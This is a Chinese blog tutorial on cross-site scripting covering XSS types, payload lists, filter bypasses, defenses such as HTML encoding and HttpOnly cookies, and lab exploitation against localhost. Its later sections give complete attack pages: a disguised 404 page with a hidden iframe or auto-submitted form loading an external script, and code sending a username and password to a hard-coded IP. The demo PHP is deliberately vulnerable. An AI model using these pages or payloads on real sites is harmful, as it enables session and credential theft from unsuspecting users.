**目录**

[XSS的原理和分类](#t0 "XSS的原理和分类")

[XSS的攻击载荷](#t1 "XSS的攻击载荷")

[XSS可以插在哪里？](#t2 "XSS可以插在哪里？ ") 

[XSS漏洞的挖掘](#t3 "XSS漏洞的挖掘 ") 

[XSS的攻击过程](#t4 "XSS的攻击过程")

[XSS漏洞的危害](#t5 "XSS漏洞的危害")

[XSS漏洞的简单攻击测试](#t6 "XSS漏洞的简单攻击测试")

[反射型XSS：](#t7 "反射型XSS：")

[存储型XSS：](#t8 "存储型XSS：")

[DOM型XSS：](#t9 "DOM型XSS：")

[XSS的简单过滤和绕过](#t10 "XSS的简单过滤和绕过")

[​XSS的防御](#t11 "​XSS的防御")

[反射型XSS的利用姿势](#t12 "反射型XSS的利用姿势")

[get型](#t13 "get型")

[post型](#t14 "post型")

[利用JS将用户信息发送给后台](#t15 "利用JS将用户信息发送给后台")

* * *

XSS的原理和分类
---------

跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将[跨站脚本攻击](https://so.csdn.net/so/search?q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020)缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！  
   
[XSS](https://so.csdn.net/so/search?q=XSS&spm=1001.2101.3001.7020)分为：存储型 、反射型 、DOM型XSS

![](https://img-blog.csdnimg.cn/20190115094753418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190115094820160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie  
反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。[反射](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%B0%84&spm=1001.2101.3001.7020)型XSS大多数是用来盗取用户的Cookie信息。  
DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：[DOM文档对象模型](https://blog.csdn.net/qq_36119192/article/details/82933873 "DOM文档对象模型")

可能触发DOM型XSS的属性

```
document.referer      
window.name      
location      
innerHTML      
documen.write
```


如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。

![](https://img-blog.csdn.net/20181003174457528?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

XSS的攻击载荷
--------

以下所有标签的 > 都可以用 // 代替， 例如 <script>alert(1)</script//

**<script>标签**：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中

```
<script>alert("hack")</script>   #弹出hack      
<script>alert(/hack/)</script>   #弹出hack      
<script>alert(1)</script>        #弹出1，对于数字可以不用引号      
<script>alert(document.cookie)</script>      #弹出cookie      
<script src=http://xxx.com/xss.js></script>  #引用外部的xss
```


**svg标签** 

```
<svg onload=alert(1)>      
<svg onload=alert(1)//
```


**<img>标签**：

```
<img  src=1  onerror=alert("hack")>      
<img  src=1  onerror=alert(document.cookie)>  #弹出cookie
```


 **<body>标签**：

```
<body onload=alert(1)>      
<body onpageshow=alert(1)>
```


**video标签:**

```
<video onloadstart=alert(1) src="/media/hack-the-planet.mp4" />
```


**style标签：**

```
<style onload=alert(1)></style>
```


XSS可以插在哪里？ 
-----------

*   用户输入作为script标签内容
*   用户输入作为HTML注释内容
*   用户输入作为HTML标签的属性名
*   用户输入作为HTML标签的属性值
*   用户输入作为HTML标签的名字
*   直接插入到CSS里
*   最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！

```
#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过      
<!-- 用户输入 -->      
<!-- --><script>alert('hack')</script><!-- -->       
#用户输入作为标签属性名，导致攻击者可以进行闭合绕过      
<div 用户输入="xx">  </div>      
<div ></div><script>alert('hack')</script><div a="xx"> </div>       
#用户输入作为标签属性值，导致攻击者可以进行闭合绕过      1
<div id="用户输入"></div>      1
<div id=""></div><script>alert('hack')</script><div a="x"></div>       1
#用户输入作为标签名，导致攻击者可以进行闭合绕过      1
<用户输入  id="xx" />      1
<><script>alert('hack')</script><b id="xx" />       1
#用户输入作为CSS内容，导致攻击者可以进行闭合绕过      1
<style>用户输入<style>      1
<style> </style><script>alert('hack')</script><style> </style>
```


XSS漏洞的挖掘 
---------

**黑盒测试**

尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：

*   URL的每一个参数
*   URL本身
*   表单
*   搜索框

**常见业务场景**

*   重灾区：评论区、留言区、个人信息、订单信息等
*   针对型：站内信、网页即时通讯、私信、意见反馈
*   存在风险：搜索框、当前目录、图片属性等

**白盒测试(代码审计)**

关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。

PHP中常见的接收参数的方式有`$_GET`、`$_POST`、`$_REQUEST`等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。

也可以搜索类似`echo`这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。

大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。

同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。

XSS的攻击过程
--------

**反射型XSS漏洞：**

1.  Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。
2.  Tom 发现 Bob的站点存在反射性的XSS漏洞
3.  Tom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击
4.  Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接
5.  嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。
6.  Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制

**存储型XSS漏洞：**

1.  Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。
2.  Tom检测到Bob的站点存在存储型的XSS漏洞。
3.  Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。
4.  Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。
5.  Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击

XSS漏洞的危害
--------

从以上我们可以知道，存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。

那么，利用XSS漏洞可以干什么呢？

![](https://img-blog.csdnimg.cn/20190115095422260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果我们的JS水平一般的话，我们可以利用网上免费的XSS平台来构造代码实施攻击。

XSS漏洞的简单攻击测试
------------

### 反射型XSS：

先放出源代码

```
//前端 1.html：      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title>反射型XSS</title>      
</head>      
<body>      
    <form action="action.php" method="post">      
        <input type="text" name="name" />      1
        <input type="submit" value="提交">      1
    </form>      1
</body>      1
</html>       1
//后端 action.php：      1
<?php      1
    $name=$_POST["name"];       1
	echo $name;      1
?>
```


 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理

![](https://img-blog.csdn.net/20180909075343238?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以，我们可以在输入框中提交数据： <script>alert('hack')</script>  ，看看会有什么反应

![](https://img-blog.csdn.net/20180908094134553?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

页面直接弹出了hack的页面，可以看到，我们插入的语句已经被页面给执行了。  
这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： 前端-->后端-->前端

### 存储型XSS：

先给出源代码

```
//前端：2.html      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title>存储型XSS</title>      
</head>      
<body>      
    <form action="action2.php" method="post">      
        输入你的ID：  <input type="text" name="id" /> <br/>      1
        输入你的Name：<input type="text" name="name" /> <br/>      1
        <input type="submit" value="提交">      1
    </form>      1
</body>      1
</html>      1
//后端：action2.php      1
<?php      1
	$id=$_POST["id"];      1
	$name=$_POST["name"];      1
	mysql_connect("localhost","root","root");      2
	mysql_select_db("test");       2
	$sql="insert into xss value ($id,'$name')";      2
	$result=mysql_query($sql);      2
?>      2
//供其他用户访问页面：show2.php      2
<?php      2
	mysql_connect("localhost","root","root");      2
	mysql_select_db("test");      2
	$sql="select * from xss where id=1";      3
	$result=mysql_query($sql);      3
	while($row=mysql_fetch_array($result)){      3
		echo $row['name'];      3
	}      3
?>
```


这里有一个用户提交的页面，数据提交给后端之后，后端存储在数据库中。然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了。

![](https://img-blog.csdn.net/20180909075606886?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们输入 1   和 <script>alert(\\'hack\\')</script>   ，注意，这里的hack的单引号要进行转义，因为sql语句中的$name是单引号的，所以这里不转义的话就会闭合sql语句中的单引号。不然注入不进去。提交了之后，我们看看数据库

![](https://img-blog.csdn.net/20180908102257643?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

可以看到，我们的XSS语句已经插入到数据库中了  
然后当其他用户访问 show2.php 页面时，我们插入的XSS代码就执行了。  
存储型XSS的数据流向是：前端-->后端-->数据库-->后端-->前端

![](https://img-blog.csdn.net/20180908102309350?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

### DOM型XSS：

先放上源代码

```
// 前端3.html      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title>DOM型XSS</title>      
</head>      
<body>      
    <form action="action3.php" method="post">      
        <input type="text" name="name" />      1
        <input type="submit" value="提交">      1
    </form>      1
</body>      1
</html>      1
// 后端action3.php      1
<?php      1
  $name=$_POST["name"];      1
?>      1
<input id="text" type="text" value="<?php echo $name; ?>"/>      1
<div id="print"></div>      2
<script type="text/javascript">      2
  var text=document.getElementById("text");      2
  var print=document.getElementById("print");      2
  print.innerHTML=text.value;  // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。      2
</script>
```


 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理

![](https://img-blog.csdn.net/20180909075918515?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们可以输入 <img src=1 οnerrοr=alert('hack')>     ，然后看看页面的变化

![](https://img-blog.csdn.net/20180909080035608?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。  
这就是DOM型XSS漏洞，这种漏洞数据流向是： 前端-->浏览器

XSS的简单过滤和绕过
-----------

前面讲sql注入的时候，我们讲过程序猿对于sql注入的一些过滤，利用一些函数（如：preg\_replace()），将组成sql语句的一些字符给过滤，以防止注入。那么，程序猿也可以用一些函数将构成xss代码的一些关键字符给过滤了。可是，道高一尺魔高一丈，虽然过滤了，但是还是可以进行过滤绕过，以达到XSS攻击的目的。

**一：区分大小写过滤标签**

先放上源代码

```
//前端 1.html：      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title>反射型XSS</title>      
</head>      
<body>      
    <form action="action4.php" method="post">      
        <input type="text" name="name" />      1
        <input type="submit" value="提交">      1
    </form>      1
</body>      1
</html>       1
//后端 action4.php：      1
<?php      1
$name=$_POST["name"];       1
if($name!=null){      1
	$name=preg_replace("/<script>/","",$name);      //过滤<script>      2
	$name=preg_replace("/<\/script>/","",$name);   //过滤</script>      2
	echo $name;       2
}      2
?>
```


 绕过技巧：可以使用大小写绕过  <scripT>alert('hack')</scripT>

![](https://img-blog.csdn.net/20180909082430512?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**二：不区分大小写过滤标签**

先放上源代码

这个和上面的代码一模一样，只不过是过滤的时候多加了一个 i ，以不区分大小写

```
$name=preg_replace("/<script>/i","",$name);    //不区分大小写过滤 <script>      
$name=preg_replace("/<\/script>/i","",$name);  //不区分大小写过滤 </script>
```


 绕过技巧：可以使用嵌套的script标签绕过   <scr<script>ipt>alert('hack')</scr</script>ipt>

![](https://img-blog.csdn.net/2018090908271884?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**三：不区分大小写，过滤之间的所有内容**

先放上源代码

这个和上面的代码一模一样，只不过是过滤的时候过滤条件发生了变化 

```
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); //过滤了<script  及其之间的所有内容
```


虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。

payload：  <img src=1 οnerrοr=alert('hack')>

![](https://img-blog.csdn.net/20180916092039141?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们可以输入 <img src=1 οnerrοr=alert('hack')>     ，然后看看页面的变化

![](https://img-blog.csdn.net/20180916092115389?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)  
XSS的防御
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

XSS防御的总体思路是：**对用户的输入(和URL参数)进行过滤，对输出进行html编码**。也就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。

对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。

对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。

如下，是使用php中的htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体

```
#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体      
$name = htmlspecialchars( $_GET[ 'name' ] );
```


如下，图一是没有进行html编码的，图2是进行了html编码的。经过html编码后script标签被当成了html实体。 

![](https://img-blog.csdnimg.cn/20190128202918105.png)

![](https://img-blog.csdnimg.cn/20190128203026880.png)

**我们还可以服务端设置会话Cookie的HTTP Only属性**，这样，客户端的JS脚本就不能获取Cookie信息了

反射型XSS的利用姿势
-----------

我们现在发现一个网站存在反射型XSS，当用户登录该网站时，我们通过诱使用户点击我们精心制作的恶意链接，来盗取用户的Cookie并且发送给我们，然后我们再利用盗取的Cookie以用户的身份登录该用户的网站。

### get型

当我们输入参数的请求类型的get类型的，即我们输入的参数是以URL参数的形式。如下图

该链接的为：[http://127.0.0.1/vulnerabilities/xss\_r/?name=<script>alert(/xss/)</script>](http://127.0.0.1/vulnerabilities/xss_r/?name= "http://127.0.0.1/vulnerabilities/xss_r/?name=<script>alert(/xss/)</script>")

![](https://img-blog.csdnimg.cn/20190128204637630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

那么，我们要怎么构造恶意代码来诱使用户点击并且用户点击后不会发现点击了恶意链接呢？

我们构造了如下代码，将其保存为html页面，然后放到我们自己的服务器上，做成一个链接。当用户登录了存在漏洞的网站，并且用户点击了我们构造的恶意链接时，该链接页面会偷偷打开iframe框架，iframe会访问其中的链接，然后执行我们的js代码。该js代码会把存在漏洞网站的cookie发送到我们的平台上，但是用户却浑然不知，他会发现打开的是一个404的页面！

```
<iframe src="http://127.0.0.1/vulnerabilities/xss_r/?name=<script src=https://t.cn/EtxZt8T></script>" style="display:none;"></iframe>
```

```
<!DOCTYPE html>      
<html>      
<head>      
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">      
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">      
    <title>404 页面不存在 </title>      
    <style type="text/css">      
        body{font:14px/1.5 'Microsoft YaHei','微软雅黑',Helvetica,Sans-serif;min-width:1200px;background:#f0f1f3;}      
        .error-page{background:#f0f1f3;padding:80px 0 180px}      1
        .error-page-main{position:relative;background:#f9f9f9;margin:0 auto;width:617px;-ms-box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:50px 50px 70px}      1
        .error-page-main h3{font-size:24px;font-weight:400;border-bottom:1px solid #d0d0d0}      1
        .error-page-main h3 strong{font-size:54px;font-weight:400;margin-right:20px}      1
    </style>      1
</head>      1
<body>      1
<iframe src="http://127.0.0.1/vulnerabilities/xss_r/?name=<script src=https://t.cn/EtxZt8T></script>" style="display:none;"></iframe>      1
<div class="error-page">      1
    <div class="error-page-container">      1
        <div class="error-page-main">      2
            <h3>      2
                <strong>404</strong>很抱歉，您要访问的页面不存在！      2
            </h3>       2
        </div>      2
    </div>      2
</div>      2
</body>      2
</html>
```


![](https://img-blog.csdnimg.cn/20190415092259653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

而我们的XSS平台将得到用户的Cookie，然后我们就可以利用得到的Cookie以用户的身份访问该网站了。

![](https://img-blog.csdnimg.cn/20190128220003931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注：我们的攻击代码可以利用的前提是存在XSS漏洞的网站的X-Frame-options未配置，并且会话Cookie没有设置Http Only属性

### post型

我们现在知道一个网站的用户名输入框存在反射型的XSS漏洞

![](https://img-blog.csdnimg.cn/2019013018333170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们抓包查看

![](https://img-blog.csdnimg.cn/20190130191523710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们构造了如下代码，将其保存为html页面，然后放到我们自己的服务器上，做成一个链接。当用户登录了存在漏洞的网站，并且用户点击了我们构造的恶意链接时，该恶意链接的页面加载完后会执行js代码，完成表单的提交，表单的用户名参数是我们的恶意js代码。提交完该表单后，该js代码会把存在漏洞网站的cookie发送到我们的平台上，但是用户却浑然不知，他会发现打开的是一个404的页面。

我们这里写了一个404页面，404页面中隐藏了一个form提交的表单，为了防止提交表单后跳转，我们在表单下加了一个iframe框架，并且iframe框架的name等于form表单的target，并且我们设置iframe框架为不可见。

```
<!DOCTYPE html>      
<html>      
<head>      
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">      
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">      
    <title>404 页面不存在 </title>      
    <style type="text/css">      
        body{font:14px/1.5 'Microsoft YaHei','微软雅黑',Helvetica,Sans-serif;min-width:1200px;background:#f0f1f3;}      
        .error-page{background:#f0f1f3;padding:80px 0 180px}      1
        .error-page-main{position:relative;background:#f9f9f9;margin:0 auto;width:617px;-ms-box-sizing:border-box;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:50px 50px 70px}      1
        .error-page-main h3{font-size:24px;font-weight:400;border-bottom:1px solid #d0d0d0}      1
        .error-page-main h3 strong{font-size:54px;font-weight:400;margin-right:20px}      1
    </style>      1
     <script type="text/javascript">      1
        function attack()      1
        {      1
            document.getElementById("transfer").submit();      1
        }      1
    </script>      2
</head>      2
<body>      2
<iframe src="form.html" frameborder="0" style="display: none"></iframe>      2
<div class="error-page">      2
    <div class="error-page-container">      2
        <div class="error-page-main">      2
            <h3>      2
                <strong>404</strong>很抱歉，您要访问的页面不存在！      2
            </h3>      2
        </div>      3
    </div>      3
    <form method="POST" id="transfer"  action="http://127.0.0.1/xss/action.php" target="frameName">      3
         <input type="hidden" name="username" value="<script src=https://t.cn/EtxZt8T></script>">      3
         <input type="hidden" name="password" value="1">      3
    </form>      3
    <iframe src="" frameborder="0" name="frameName" style="display: none"></iframe>      3
</div>      3
</body>      3
</html>
```


当用户点击了我们构造的恶意链接，发现打开的是一个404页面。实际上这个页面偷偷的进行了表单的提交。

![](https://img-blog.csdnimg.cn/20190130192802545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

而我们的XSS平台也收到了发送来的数据(这数据中没有Cookie的原因是这个网站我没设置Cookie，只是随便写的一个页面)。

![](https://img-blog.csdnimg.cn/20190130192932750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用JS将用户信息发送给后台
--------------

```
<!DOCTYPE html>      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title></title>      
    <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>      
    <script>      
        $(function(){      
            //我们现在假如 user和pass是我们利用js获得的用户的用户名和密码      1
            user="admin";      1
            pass="root";      1
            url="http://120.79.74.249:8080/?user="+user+"&pass="+pass;      1
            var frame=$("<iframe>");      1
            frame.attr("src",url);      1
            frame.attr("style","display:none");      1
            $("#body").append(frame);      //添加一个iframe框架，并设置不显示。这个框架会偷偷访问该链接。      1
        });      1
    </script>      1
</head>      2
<body id="body">      2
    <h3>hello,word!</h3>      2
</body>      2
</html>
```


当用户访问了该页面，我们后台就可以看到用户访问记录。

![](https://img-blog.csdnimg.cn/20190412171825660.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[DVWA之DOM XSS(DOM型跨站脚本攻击)](https://blog.csdn.net/qq_36119192/article/details/82932557 "DVWA之DOM XSS(DOM型跨站脚本攻击)")

                  [DVWA之Reflected XSS(反射型XSS)](https://blog.csdn.net/qq_36119192/article/details/82935440#High "DVWA之Reflected XSS(反射型XSS)")

                  [DVWA之Stored XSS(存储型XSS)](https://blog.csdn.net/qq_36119192/article/details/82935895 "DVWA之Stored XSS(存储型XSS)")

                  [挖洞经验丨印尼电商平台Tokopedia的反射型XSS漏洞](https://www.freebuf.com/vuls/207025.html "挖洞经验丨印尼电商平台Tokopedia的反射型XSS漏洞")

                  [深入探究浏览器编码及XSS Bypass](https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA "深入探究浏览器编码及XSS Bypass")

###